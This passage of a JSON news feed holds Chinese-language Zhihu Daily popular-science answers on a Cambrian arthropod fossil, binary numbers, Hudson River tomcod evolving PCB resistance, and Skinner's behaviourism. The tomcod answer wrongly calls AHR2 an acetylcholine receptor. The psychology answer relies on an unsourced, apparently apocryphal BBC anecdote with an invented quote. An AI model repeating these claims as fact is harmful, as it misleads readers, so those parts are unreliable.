target=\"_blank\">点这买几硕快充套装&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/099145647916e7db7f326bc2a78c7794\"></figure><p>🖱️ <a href=\"https://sspai.taobao.com/search.htm?orderType=&amp;viewType=grid&amp;keyword=%CA%F3%B1%EA%B5%E6&amp;lowPrice=&amp;highPrice=\" target=\"_blank\">点这买周边鼠标垫&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/16/article/629a067d7587deb828eca3af300afdca\"></figure><hr>\n<p>💬 上新通知、专属优惠、<s>调戏水獭</s>……欢迎微信扫码进群，获取更多派商店消息。👇</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/16/da37fa8219b8c3211d94d6f6a6e5be9d.png\"></figure><p>&gt; 关注少数派 <a href=\"https://shop549593764.taobao.com/index.htm?spm=2013.1.w5002-18497266160.2.2fa346beBU2yc8\" target=\"_blank\">官方周边淘宝店</a> / <a href=\"https://weibo.com/u/6293993963\" target=\"_blank\">@吃派的水獭</a>，了解更多新奇有趣的科技产品 🏬</p>\n<p>&gt; 提升工作效率，掌握生活技巧，来少数派 <a href=\"https://shop184770392.taobao.com/index.htm?spm=a1z10.1-c.w5002-23492264167.2.528c2ac4r8butZ\" target=\"_blank\">正版软件淘宝店</a> 看看 💾</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67729"},{"title":"如果有机会，你最想吃哪种古生物？","date":"2021-07-16 23:07:57","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-144230422b6d3286f0edba683269d851_l.jpg?source=8673f162\"><span>中科院南古所，</span><span>一起来聊聊古生物的事儿</span>\n<a href=\"https://www.zhihu.com/question/471807591/answer/1997280384\" hidden>阅读原文</a>\n</div>\n<div>\n<p>体长达 7cm，头小身体长，如果存在这么一种虾仁，你心动不？</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-208edd38294bb88a60ca29a5c60c5b4d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>来自云南的麒麟虾，可惜没活到今天图片来源：谭超</figcaption></figure><p>这就是近期中国科学院南京地质古生物研究所科学家发现的一种 5 亿多年前长相奇异的麒麟虾。之所以受到广泛关注，是因为麒麟虾的化石能够有效地帮助我们探索“节肢动物的起源”这一科学界重大问题，这一发现发表在权威学术期刊<em>Nature</em>上。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-6c22ec59ee34e82cab60b50046f794b0_720w.jpg?source=8673f162\" alt=\"\"><figcaption>麒麟虾化石 图片来源：中国科学院南京地质古生物研究所</figcaption></figure><p>一切要从发现的麒麟虾的身体结构说起。麒麟虾身上，既保留有较原始的器官，也有新的构造，处于节肢动物祖先类型和真节肢动物之间。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-16c816df487a2c7d27165cf167944914_720w.jpg?source=8673f162\" alt=\"\"><figcaption>麒麟虾复原图 图片来源：作者提供</figcaption></figure><p>这些新的构造都是啥？</p>\n<p><strong>1. 硬化表皮</strong></p>\n<p>说到节肢动物，不得不提奇虾。奇虾是当时海中一霸，可它的表皮是比较软的。而麒麟虾的表皮由几丁质强化，更为坚硬，面对寒武纪的大部分对手都不虚。</p>\n<p>当然，与麒麟虾同处于寒武纪海洋中的三叶虫也是身披坚硬的盔甲的，并且其外骨骼是由以甲壳素为主联合方解石、磷化钙等矿物组成的，是名副其实的“重甲”。但注意，这样的结构虽能够加强防御，却也拖慢了三叶虫行动的脚步。（更多奇虾与三叶虫的信息，可参阅“<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s%3F__biz%3DMzI3MzE3OTI0Mw%3D%3D%26mid%3D2247495055%26idx%3D1%26sn%3D3a7a1bf22c9d04a02f13a27b0ff3fac7%26scene%3D21%23wechat_redirect\" target=\"_blank\" rel=\"nofollow noreferrer\">如果你在寒武纪，要怎么才能生存下去</a>”）</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-d27b19ea8a77a089ff3a3e3ff635e492_720w.gif?source=8673f162\" alt=\"\"><figcaption>图片来源：谭超</figcaption></figure><p>相比之下，麒麟虾虽不具备三叶虫那超硬的矿化外骨骼，可它却更为轻便灵活。历史长河的案例表明，如果过于追求重甲而牺牲了机动获取信息等其它能力，似乎就会陷于某种被动中，最终被时代抛弃。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-593cdc9e442185e1a1a322a60f0e48d3_720w.jpg?source=8673f162\" alt=\"\"><figcaption>三叶虫、鼠式坦克与战列舰，胜不能追，败不能退，卒 图片来源：谭超</figcaption></figure><p><strong>2. 愈合的头部</strong></p>\n<p>麒麟虾身材修长，看起来近乎九头身的完美比例。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-8189d53c0d65b40c26bfba25f4c50051_720w.jpg?source=8673f162\" alt=\"\"><figcaption>化石保存了麒麟虾修长的身材；中间的两条深色线：上面是消化道、下面是腹神经索 图片来源：中国科学院南京地质古生物研究所</figcaption></figure><p>虽然和现今的虾比起来，它的头看上去很小，但是相比更早的类群来说已经很大了，这是因为麒麟虾的头部其实包含几个体节。</p>\n<p>简单来说，麒麟虾打通了虫体的前 4 个体节，形成了一个相对较大的整体空间，这就为“大型设备”整合组装在一起创造了条件。</p>\n<p>麒麟虾的头部有 5 只眼睛，这与当时海洋中另一种动物——奥帕宾海蝎相似。粗而短的前肢，靠抱、握、夹来猎食，与寒武纪的奇虾相似。麒麟虾的头已经集进食、感官及控制于一体。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-95b64175747a832f9bc5461299870544_720w.jpg?source=8673f162\" alt=\"\"><figcaption>麒麟虾在寒武纪的表现可圈可点，这离不开新结构的有机整合 图片来源：谭超</figcaption></figure><p>麒麟虾的创新操作好比打开了潘多拉魔盒。之后的节肢动物在此基础上愈合了更多的体节，也融入了更多功能。现今的虾将十多个体节融合成头胸部，包裹在一整块头胸甲之中，内置各种器官，担负感觉、行走、捕食、消化、呼吸等众多功能。所以，相比之下，它们的头部看起来要大很多。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-2f473a892909a8f81f5c3f64b907e737_720w.jpg?source=8673f162\" alt=\"\"><figcaption>现生虾的头胸甲内包含众多器官图片来源：谭超</figcaption></figure><p><strong>3. 分节腿肢</strong></p>\n<p>早期的附肢叫叶足，比较柔软，却能够让动物的身体抬离地面，帮助动物们站起来，并进行移动，例如微网虫、怪诞虫等。到了麒麟虾这一阶段，它们的腿肢开始分节，并包裹上“装甲”，变得坚硬强壮，更加高级。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-938db812fac857308be3025d6d769f38_720w.jpg?source=8673f162\" alt=\"\"><figcaption>1 叶足（微网虫），2 双肢型分节附肢（麒麟虾）图片来源：谭超</figcaption></figure><p>分节腿肢算是真节肢动物的入门标准，它极具潜力，后辈们在此基础上做出了更大的创造和升级，演化出了<strong>撕咬的颚、吸血的针、感知的触角、御敌的大钳子等，甚至纺丝和交配的工具。</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-0a2f265caea7b007483537810befea9f_720w.jpg?source=8673f162\" alt=\"\"><figcaption>蚂蚁头上灵活的触角与强壮的颚 图片来源：wikipedia-Mariana Ruiz</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-acc9baea1c2076ed3c71f07076c13bb8_720w.jpg?source=8673f162\" alt=\"\"><figcaption>雌性蚊子吸血的口器 Anopheles stephensi 图片来源：Jim Gathany -PHIL</figcaption></figure><figure><img src=\"https://pica.zhimg.com/v2-6542eb125c514c51ac94f2504654c315_720w.jpg?source=8673f162\" alt=\"\"><figcaption>有大钳子的蝎子图片来源：Dreamtime.com</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-0119475455520ed6ab41b41cd38e45c9_720w.jpg?source=8673f162\" alt=\"\"><figcaption>蜘蛛獠牙及腹部的纺器图片来源：Graphik：S.Scharf</figcaption></figure><p>以上三个明显的特征，表明了麒麟虾已经跨入了真节肢动物的大门槛，但它身上仍保留了一部分节肢动物祖先的特征。</p>\n<p><strong>1. 五眼海蝎</strong></p>\n<p>麒麟虾并未演化出触角，而是直接照搬了奥帕宾海蝎头上的五只眼睛，以此作为主要感官器官。这些复眼由很多小眼组成，小眼前面有块晶状体，后面连有一条视神经，每个小眼捕捉到的光线形成了一个像素点。很多小眼排列在一起，便组成了完整的图像。</p>\n<p>它的复眼形状为半球形，能接收到光线角度很广，使得视角范围非常大；虽然小眼不能调焦，视距较近，但对光线变化非常敏感，反应迅速；而且还有 5 只，所以一旦盯上目标，就能牢牢锁定。无论捕食还是逃避敌害，作用都很大。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-ea0daf7872f84a704347fad2c54c89fe_720w.jpg?source=8673f162\" alt=\"\"><figcaption>眼观六路，反应敏捷，适合刺客型选手图片来源：英雄联盟</figcaption></figure><p><strong>2. 捕食前附肢</strong></p>\n<p>麒麟虾还照搬奇虾的前附肢，把第一对附肢特化成了捕食前附肢，又坚硬又灵活。毕竟在寒武纪想吃上肉，还得靠这带倒刺的家伙事儿。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-1e7b72ca5ca79ca1f9683942f5bbb020_720w.jpg?source=8673f162\" alt=\"\"><figcaption>麒麟虾与早期节肢类前附肢演化重建 图片来源：中国科学院南京地质古生物研究所</figcaption></figure><p>从这张图可以看出早期节肢动物前附肢的变化：麒麟虾和奇虾的捕食大附肢同源（A、B）。之后分化为两类，一类节数减少，演化为鳌肢类和大附肢类（C），往力量型发展，增强了捕食能力。而等刺虫这类，一部分保留了捕食功能，另一部分似乎又变细，往灵活性发展（D）。之后又分化出纳罗虫、抚仙湖虫、瓦普塔虾等，它们的前附肢看起来更像触角了（E）。</p>\n<p>在生命演化过程中“谜团”不断，麒麟虾化石的发现，架起了从奇虾演化到真节肢动物的中间桥梁，填补了节肢动物起源过程中关键的缺失环节，为生物进化论增添了又一有力实证。</p>\n<p>出品：科普中国</p>\n<p>制作：刘芸、谭超、王冠群、潘浩晨（中国科学院南京地质古生物研究所 ）</p>\n<p>监制：中国科学院计算机网络信息中心（本文中标明来源的图片已获得授权）</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-75ae0e3c9a791c916003ec6ac7c35b35_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/471807591\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738157"},{"title":"“二进制”是什么？","date":"2021-07-16 23:07:49","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-77a732332f0cc81b4e47cae79012eefc_l.jpg?source=8673f162\"><span>Vortex，</span><span>B站 space.bilibili.com/10252845</span>\n<a href=\"https://www.zhihu.com/question/330681697/answer/1981060025\" hidden>阅读原文</a>\n</div>\n<div>\n<p>来尝试一下写科普文～ 希望这篇有关“二进制”的科普文章连初中生甚至小学生都能听懂。</p>\n<p><strong>1 什么是二进制</strong></p>\n<p>所谓的“二进制<sup>[1]</sup>”，就是一种仅用“1”和“0”的排列组合来表示具体数值的，一种记数方法。</p>\n<p>例如“1001 1011”就是一个二进制数，它的每位都是非 1 即 0 的，不会出现 2 或者 3 这样的其它数字。但是仅通过 1 和 0 的组合是如何表示某个具体数值的？</p>\n<p><strong>2 二进制的数值例子</strong></p>\n<p>我们先从一个具体例子开始：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-bed9f26100e922116b46ab08fc7505b1_720w.jpg?source=8673f162\" alt=\"\"><figcaption>图 1，二进制数“1101 0110”</figcaption></figure><p>这是一个二进制数（图 1），那么它对应的数值是什么呢？它对应的数值是这样计算的：</p>\n<p>首先我们把它的每位分开，然后分别乘上 1, 2, 4, 8, 16, ... 64, 128（图 2）：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-a3acc3094dc8cf0fbf379202547810df_720w.jpg?source=8673f162\" alt=\"\"><figcaption>图 2，每位分开并分别乘上 1, 2, 4, 8, ...</figcaption></figure><p>最后将它们加起来，就得到了这个二进制数对应的数值（图 3）：</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-d4ee672fe93206cf779bbe46e16e57f8_720w.jpg?source=8673f162\" alt=\"\"><figcaption>3，将所有结果加起来，就得到了这个二进制数对应的数值“214”</figcaption></figure><p>即，二进制数“1101 0110”所对应的数值是“214”。</p>\n<p>现在你可以试着计算一下二进制数“1000 1000”所对应的数值！</p>\n<p><strong>3 我们生活中所采用的计数法</strong></p>\n<p>看完上面这段说明后，是不是还是感觉晕乎乎的？为什么要设计出这么反人类的计法？以及，它真的可以表示所有数值吗？</p>\n<p>其实，二进制和我们生活中所采用的记数方法，阿拉伯数字系统是一样的。</p>\n<p>比如，为什么我们会把“514￥”念作“五百一十四 块钱”，而不是“五一四 块钱”呢？</p>\n<p>其实，念出“五百一十四”的时候，我们就已经进行了一遍，之前所演示的相乘并求和的过程（图 4）。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-47677c3ecb4bf68f7e845fa83ed1d7f9_720w.jpg?source=8673f162\" alt=\"\"><figcaption>图 4，“五百一十四”所对应的数值</figcaption></figure><p>那么现再回过头去看下上面二进制的求值过程，是不是又觉得二进制变得亲切了起来呢？</p>\n<p>其实二进制和我们平时所使用的记数法是一样的，只不过我们平常会使用十个不同的数字符号来表示数值：“0,1,2,3,4,5,6,7,8,9”，并且每位需要分别乘上“1, 10, 100, 100...”<sup>[2]</sup>。</p>\n<p>而在二进制的世界中只有“1”和“0”，并且每位分别乘上的是“1, 2, 4, 8, 16, ...”。</p>\n<p><strong>4 位权</strong></p>\n<p>这个每位分别乘上的固定数值，就是所谓的“位权（weight）”，即“每位的权重”。</p>\n<p>前面说了，在我们平常生活所使用的记法中，每位的位权分别是“1, 10, 100, 1000”，一般的，从第 1 位开始，第</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=i\" alt=\"\"></p>\n<p>位的位权其实就是</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=10%5E%7Bi-1%7D\" alt=\"\"></p>\n<p>。而对于二进制，第</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=i\" alt=\"\"></p>\n<p>位的位权则为</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=2%5E%7Bi-1%7D\" alt=\"\"></p>\n<p>。</p>\n<p>一般地，“</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=r\" alt=\"\"></p>\n<p>进制”第</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=i\" alt=\"\"></p>\n<p>位的位权就是：</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ccolor%7Bred%7D%7Br%5E%7Bi-1%7D%7D\" alt=\"\"></p>\n<p>例如三进制第</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=i\" alt=\"\"></p>\n<p>位的位权就是</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=3%5E%7Bi-1%7D\" alt=\"\"></p>\n<p>。</p>\n<p>所以，我们平时生活所使用的记法，也可以叫做“十进制”。</p>\n<p>当然，计算机的专业人士会比较喜欢从“0”开始数（图 5），那么此时第</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=i\" alt=\"\"></p>\n<p>位的位权公式实际上应当是</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ccolor%7Bred%7D%7Br%5Ei%7D\" alt=\"\"></p>\n<p>（图 5）。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-365d5722b25dcc4ddff5cae2b38179c3_720w.jpg?source=8673f162\" alt=\"\"><figcaption>图 5，从 0 开始数</figcaption></figure><p>从 0 开始数的话，位权公式就变成了更简洁的“</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=r%5Ei\" alt=\"\"></p>\n<p>”，也许他们才是对的呢～</p>\n<p>从这里开始，下文中所有数都是从第 0 位开始数的，即第</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=i\" alt=\"\"></p>\n<p>位位权为</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=r%5Ei\" alt=\"\"></p>\n<p>，而不是</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=r%5E%7Bi-1%7D\" alt=\"\"></p>\n<p>。</p>\n<p><strong>4 位权与进位</strong></p>\n<p>那么“位权（weight）”的实际意义究竟是什么呢？其实它规定了进位的规则。</p>\n<p>比如，十进制第</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=i\" alt=\"\"></p>\n<p>位的位权为</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=10%5Ei\" alt=\"\"></p>\n<p>，具体地，从第 0 位开始，它的每位位权分别是“1, 10, 100, 1000...”。</p>\n<p>我们小学就学过，十进制的加法是逢十进一的，个位满十，就向十位进一。这意思可不就是，1 个 <strong>十位的“1”</strong> 代表 10 个 <strong>个位的“1</strong>” 吗？</p>\n<p>因此，十位的位权是“10”。然后，1 个百位的代表 10 个十位，因此百位的位权是“100”，以此类推。</p>\n<p>那么二进制呢？从第 0 位开始，二进制每位位权分别是“1, 2, 4, 8”，或者说</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=2%5E0%2C2%5E1%2C2%5E2%2C2%5E3%5Ccdots\" alt=\"\"></p>\n<p>。</p>\n<p>在二进制中，1 个 <strong>第 2 位</strong> 代表 2 个 <strong>第 1 位</strong>，1 个 <strong>第 1 位</strong> 代表 2 个 <strong>第 0 位</strong>。所以，二进制是“逢二进一”的。</p>\n<p>那么一般地，“</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=r\" alt=\"\"></p>\n<p>进制”就是“逢</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=r\" alt=\"\"></p>\n<p>进一”的。这也是为什么，它的名字叫做</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=r\" alt=\"\"></p>\n<p>“进”制。</p>\n<p><strong>5 小结</strong></p>\n<ol>\n<li>我们生活中所使用的记数系统也叫“十进制”，它是“逢十进一”的。</li>\n<li>“二进制”是“逢二进一”的。</li>\n<li>从第 0 位开始数，“ <img src=\"https://www.zhihu.com/equation?tex=r\" alt=\"\"> 进制”第 <img src=\"https://www.zhihu.com/equation?tex=i\" alt=\"\"> 位位权为“ <img src=\"https://www.zhihu.com/equation?tex=r%5Ei\" alt=\"\"> ”。</li>\n<li>“ <img src=\"https://www.zhihu.com/equation?tex=r\" alt=\"\"> 进制”是“逢 <img src=\"https://www.zhihu.com/equation?tex=r\" alt=\"\"> 进一”的。</li>\n<li>对于“ <img src=\"https://www.zhihu.com/equation?tex=r\" alt=\"\"> 进制数”，将它的每位乘上对应的位权，再将它们全部加起来，就能得到这个数对应的数值</li>\n</ol>\n<p><strong>6 扩展</strong></p>\n<p>下面是一些扩展思考题：</p>\n<ol>\n<li>二进制第 <img src=\"https://www.zhihu.com/equation?tex=l\" alt=\"\"> 位小数的位权是多少？</li>\n<li>从第 0 位开始数， <img src=\"https://www.zhihu.com/equation?tex=n\" alt=\"\"> 位 <img src=\"https://www.zhihu.com/equation?tex=r\" alt=\"\"> 进制正整数的最小值和最大值分别是多少？</li>\n<li>对于所有的整数，都能分别找到唯一对应的二进制表示吗？</li>\n<li>对于所有整数，都能分别找到唯一对应的 <img src=\"https://www.zhihu.com/equation?tex=r\" alt=\"\"> 进制表示吗？</li>\n</ol>\n<p>其实第 1 个问题超纲了，第 3、4 个问题相对而言也比较难。但是它们都非常值得思考。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/330681697\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738148"},{"title":"动物有哪些演化是人类造成的？","date":"2021-07-16 23:07:42","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-a828256341663bc1234f028f047f576d_l.jpg?source=8673f162\"><span>苏澄宇，</span><span>动物科学 / 冷门问题收割者/看心情更新</span>\n<a href=\"https://www.zhihu.com/question/49805662/answer/353850479\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>美国哈德逊河多氯联苯污染，影响鱼类进化</strong></p>\n<hr>\n<p>从 1947 年到 1977 年的三十年时间里，通用电气公司（GE）共往纽约哈德逊河中倾倒了 130 多万磅的工业废物。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ff4eb570472736c1b126ea4e1bf78bc9_720w.jpg?source=8673f162\" alt=\"\"><figcaption>纽约哈德逊河</figcaption></figure><p>这些工业废水来源于变压器内的绝缘液体，液体中包含多氯联苯（PCBs）。废液中的多氯联苯，大部分是通过由孟山都公司制造的，包括多氯联苯 1242 和多氯联苯 1016 。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-5ad01d5b46ec12bb422ae24d08de67cd_720w.jpg?source=8673f162\" alt=\"\"><figcaption>旧变压器中含有多氯联苯（变压油）</figcaption></figure><p>这是一种有毒物质，据美国环境保护署（EPA）的报告指出，多氯联苯已被证明会导致动物，包括人类的癌症，其毒害作用也包括内分泌紊乱和神经毒性。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-9d9d3ba528bea11f756383c2fcc7528a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>PCBs 的警告牌</figcaption></figure><p>虽然 1979 年美国国会已经禁止了多氯联苯的生产，但为时已晚，多氯联苯、镉和其他有毒物质已经污染了流向纽约市的哈德逊河近 320 公里，包括多条支流。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-a09b50cce2fc156867a4805da70414e1_720w.jpg?source=8673f162\" alt=\"\"><figcaption>多氯联苯（PCBs）</figcaption></figure><p>1976 年纽约环境保护部（NYSDEC）出于考虑多氯联苯对人体健康的影响，禁止在哈德逊河谷钓鱼，建议最好不要从哈德逊瀑布到特洛伊的 30 公里河段捕鱼。</p>\n<p>纽约州卫生部不建议 50 岁以下的妇女和 15 岁以下的儿童吃科林斯帕尔默瀑布水坝以南捕获的任何鱼，而其他人则建议每月只吃 1 至 4 顿哈得逊河里的鱼，能吃“鱼”否，取决于捕捞的物种和河段。</p>\n<p>通用公司后来被美国环保局责令清理河道，清污费用至今已经多达 13.3 亿美元。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-13d462476844353b54354f48abc76dc6_720w.jpg?source=8673f162\" alt=\"\"><figcaption>GE 在 2012 年对哈德逊河进行疏浚作业</figcaption></figure><p>哈德逊河中的鱼类死亡甚多，而一种名为<strong>大西洋小鳕</strong>（Microgadus tomcod）的鱼类尤为遭殃：它们生活在化学物高度沉积的河底，喜欢在河底进食，等于是<strong>天天与超高剂量的毒物为伍</strong>。</p>\n<p>在 1983 年的一次调查中，这类正常寿命可达 7 年的小鳕几乎全都短命——97%只有 1 岁，能活到 2 岁的只占 3%，许多鱼出现了肿瘤。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-819337d863147512be51139ff2511800_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Microgadus tomcod</figcaption></figure><p>可是不久后人类发现，它们不仅顽强地生存了下来，而且连年龄结构也恢复到了正常的范围。科学家们一度对此感到困惑。</p>\n<p>2011 年，纽约大学医学院的一项研究发现，揭开了这个谜题。由于上个世纪中叶的严重化学污染，纽约哈德逊河中的一种鱼类，出现了自然界中罕有的进化，<strong>这种进化在短短几十年内完成的</strong>，堪称奇迹。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-a6ce42414680306f84f8be29a982c212_720w.jpg?source=8673f162\" alt=\"\"><figcaption>研究人员在冬季收集哈德逊河的鳕鱼样本</figcaption></figure><p>研究人员发现普通小鳕的体内有一种叫做 AHR2（乙酰胆碱受体）的蛋白质，当这种蛋白质接触到 PCBs 时，会发生结合产生复合物，转运到细胞核内，对鱼的健康产生影响。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-7c76cc83b8a9ec707201f7d72810c750_720w.jpg?source=8673f162\" alt=\"\"></figure><p>通过对比哈德逊河中受污染河段的鳕鱼和未经污染的鳕鱼，发现受污染河段的 99%的鳕鱼在 AHR2 的表达基因上有了不同。这种突变了的 AHR2 蛋白质很难与 PCBs 产生反应，提升了鱼的抗毒性。同时，这一基因突变也使鱼卵对 PCBs 产生了相对于没有突变的胚胎<strong>高达 100 倍</strong>的<strong>抗毒作用。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-abbe71d56a977f5eca41d0eca690fa82_720w.jpg?source=8673f162\" alt=\"\"><figcaption>大西洋沿岸河口的大鳕鱼的 AHR2-1 和 AHR2-2 等位基因的频率。n 表示每个河口分析的标本数量。</figcaption></figure><p>在短短五十年的“物竞天择”过程中，这些进化的鳕鱼不仅没有灭绝，反而数量迅速壮大、成为了赫德逊河中新的常态。</p>\n<p>研究小组目前正在研究换取它们的毒素抗性付出的代价是什么，毕竟钢炼有句名言：一个人如果没有牺牲，根本不会得到任何东西，这就是所谓的等价交换</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-6e588eb8a5472fea9abaa6f4890df495_720w.jpg?source=8673f162\" alt=\"\"></figure><p>也不知道这种进化是不是达尔文所料到的。</p>\n<p><a href=\"http://link.zhihu.com/?target=http%3A//science.sciencemag.org/content/331/6022/1322\" target=\"_blank\" rel=\"nofollow noreferrer\">Mechanistic Basis of Resistance to PCBs in Atlantic Tomcod from the Hudson River</a></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/49805662\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738141"},{"title":"心理学领域存在哪些反转了经典理论的实验？","date":"2021-07-16 23:07:34","description":"<div>\n<div>\n<div>\n<img src=\"https://pica.zhimg.com/v2-4a4e1a659766d5dcc291b5bba165b20f_l.jpg?source=8673f162\"><span>黄磊，</span><span>我的自卑只与知识有关</span>\n<a href=\"https://www.zhihu.com/question/272052173/answer/367184897\" hidden>阅读原文</a>\n</div>\n<div>\n<p>与其说这是反转了经典理论的实验，不如说这可能是二十世纪最著名的全球直播打脸的实验。</p>\n<p>自心理学诞生以来，关于该如何对人类意识进行科学的研究就分为两大学派之间的对立。</p>\n<p>一派是行为主义学派主张的还原论。行为主义认为唯一可以用科学方法研究就是个体的外显行为，研究人类意识就像研究化学中的元素一样，要把意识经验拆分成最小的基本单位，然后再研究这些要素之间是如何联系的。进一步，行为主义认为学习就是刺激与反应之间的联结，一切学习都是刺激—反应强化的结果。</p>\n<p>另一派则是格式塔学派主张的内省法。格式塔学派认为要把人的意识看作是一个整体，人在进行认识活动时会在头脑里构成一个神秘的“格式塔“（Gestalt），进而对事物的各个部分形成整体的理解。这个过程绝不是什么简单的要素集合，因而学习也并不是什么简单的刺激—反应强化，而依赖于一种“顿悟”。</p>\n<p>作为行为主义的集大成者，早年的斯金纳通过实验发现，动物的学习行为是随着一个起强化作用的刺激而发生的。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-a5b85d36c133e8bab48b871171b3bc50_720w.jpg?source=8673f162\" alt=\"\"></figure><p>他设计了一个斯金纳箱，箱内有一柄操作杆，这一操作杆与提供食物的装置相连接。随后他把饥饿的小白鼠置于箱中，偶然踏上操作杆的小白鼠发现食物从天而降。在小白鼠的多次尝试以后，它学会了不断地按压杠杆直到吃饱为止。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-fb0aec87d7305689cf8df91f008d7c0f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这一由学习者自发的行为，即小白鼠偶然踩到操作杆，被他称为“操作性条件反射”；而食物从天而降则被他称为“积极强化”。</p>\n<p>随后斯金纳把动物的学习行为推而广之到人类的学习行为上。1957 年，他正式发表了《言语行为》一书，书中他认为人类的语言学习也不过是一种简单的从刺激到反应这样一个反复模仿、操练的习惯形成过程。</p>\n<p>到了上个世纪七十年代，斯金纳大有在心理学界一统江山的味道。他的行为主义理论——人类可以通过操作性条件反射和积极强化来学会一切，被许多社会实践机构所采取。在欧美的少管所，斯金纳的理论成为了改造少年的金科玉律，人们坚信只要靠相应的制度设计就可以让孩子们走上正途。</p>\n<p>正在这如火如荼的实践背后，反对的声音也开始慢慢出现，人们对于斯金纳的指责简单且明了——学习绝没有那么简单。</p>\n<p>在这些质疑声的议论中，BBC 地平线节目组设计了一场语言学实验并邀请了斯金纳参与。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-cac24c29a7ccbbd99f8d0540984cfa64_720w.jpg?source=8673f162\" alt=\"\"></figure><p>片中，年长的女孩在主持人的积极引导下顺利地复述出了她听到的话，这似乎与斯金纳的理论不谋而合。然而，另一组实验中低年级的小女孩任由主持人如何引导、鼓励，她仍然不能重复出语法结构较为复杂的句子。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-fa2cf8ad89a9ce294e25a0a63f884390_720w.jpg?source=8673f162\" alt=\"\"></figure><p>面对这个实验结果，行为主义的信条——一切学习都是机械模仿的结论被直接打脸，在自己理论面向全球直播并被当场证伪的那一刻，斯金纳笑容呆滞，面色凝重。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-1e379025302c0495d6b7a022ba4c6e60_720w.jpg?source=8673f162\" alt=\"\"></figure><p>不过，斯金纳先生最后的回复是值得令人回味的。他说：“不可否认，我的理论的确不能解释所有现象，对此，也许每个人面对陌生领域最好的办法，就是首先承认自己的无知。”</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-e9e5ad30805ff82608a7bf02e6715b73_720w.jpg?source=8673f162\" alt=\"\"></figure><p>一位领域内顶级的知名学者，在面对他人对其终生研究的心血成果的直接质疑时，他并没有选择暴怒或是狡辩，而是诚恳地承认了自己的不足。这种求真的态度，希望能与每一位热爱真理的读者共勉。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/272052173\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738167"},{"title":"哪些家具其实根本没必要买？","date":"2021-07-16 